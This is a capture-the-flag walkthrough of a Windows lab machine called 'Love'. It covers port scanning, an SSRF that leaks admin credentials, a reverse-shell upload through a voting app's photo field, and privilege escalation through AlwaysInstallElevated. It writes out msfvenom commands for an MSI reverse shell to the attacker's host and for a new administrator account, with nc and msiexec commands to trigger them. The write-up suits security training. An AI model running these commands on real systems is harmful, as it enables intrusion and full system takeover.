## Recon 

### nmap

- Doing `sudo nmap -sC -sV -oN nmap/initial 10.10.10.239 -v` I've found many open TCP ports

```bash
Discovered open port 139/tcp on 10.10.10.239
Discovered open port 443/tcp on 10.10.10.239
445/tcp microsoft-ds Windows 10 Pro 19042 microsoft-ds (workgroup: WORKGROUP)
80/tcp Apache httpd 2.4.46 ((Win64) OpenSSL/1.1.1j PHP/7.3.27)
Discovered open port 135/tcp on 10.10.10.239
3306/tcp mysql?
5000/tcp  www.example.com, LOVE, www.love.htb; OS: Windows; CPE: cpe:/o:microsoft:windows
```


- Using `smbmap` and `smbclient` I was not able to get in port 445

```bash
smbmap -H 10.10.10.239 -u brun0 -p brun0
[!] Authentication error on 10.10.10.239

smbclient -N -L //10.10.10.239
session setup failed: NT_STATUS_ACCESS_DENIED
```

- Moving into port 3306, got nothing again ...

```bash
mysql -h 10.10.10.239
ERROR 1130 (HY000): Host '10.10.14.6' is not allowed to connect to this MariaDB server
```


- Found `staging.love.htb/organizationName=ValentineCorp/` in nmap scan. So I edited `/etc/hosts` and navigated to http://staging.love.htb

### gobuster

- I like to have recon always going in the background so I started gobuster and found some cool locations

## User

- First I saw `http://love.htb/admin` but I needed creds to login so I decided to jump to `http://stating.love.htb` 
- Pressing in `demo` got to a free file scanner so I tried SSRF. 
- I tried `http://localhost` but I got nothing ... so After a while I decided to use `http://localhost:5000` and boom , got creds for `http://love.htb/admin/`. 
- I used port 5000 because in nmap is saying `403 forbiden` so I assumed I could SSRF so the server thinks the requests is being made internaly.

- After login in into `http://love.htb/admin` I played a little bit to understand how the web application works.
- Basically it's a simple voting system and therefore I could create a new voter. This voter has a Firstname, Lastname, Password and, the juicy one, a photo.
- I created a user and uploaded a rev shell in the photo field.

- Next I logged in while I was listening on port `9999` and got a shell as `phoebe`

- Got creds in `C:\xampp\passwords.txt` and at the same time got user flag in `C:\Users\Phoebe\Desktop\user.txt`

## Root

- Since it was a windows machine I uploaded [winPEAS](https://github.com/carlospolop/PEASS-ng/tree/master/winPEAS) and found [AlwaysInstallElevated](https://docs.microsoft.com/en-us/windows/win32/msi/alwaysinstallelevated) ON

- Googled a little bit and found that if AlwaysInstallElevated is ON its possible that any user of any privilege can install (execute) `.msi` files as `NT AUTHORITY\SYSTEM`

- So I double checked that AlwaysInstallElevated was On using the following commands and they both returned `1`.

```powershell
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
```

- Next step was to priv esc so I had two options
    - I could create a metasploit payload using `msfvenom -p windows/adduser USER=rottenadmin PASS=P@ssword123! -f msi -o alwe.msi` and then execute that `alwe.msi` on the windows machine and user `rottenadmin` become `NT AUTHORITY\SYSTEM`
    - Or I could create a reverse shell using `msfvenom -p windows/x64/shell_reverse_tcp LHOST=MY_IP LPORT=MY_LISTENING_PORT -f msi -o reverse.msi`, upload `reverse.msi` to the windows machine, start listening on my local machine using `sudo nc -lvnp MY_LISTENING_PORT` and then, inside the windows machine, run `msiexec /quiet /qn /i reverse.msi` to trigger the reverse shell.

- I decided to use the second approach and after those steps I got root
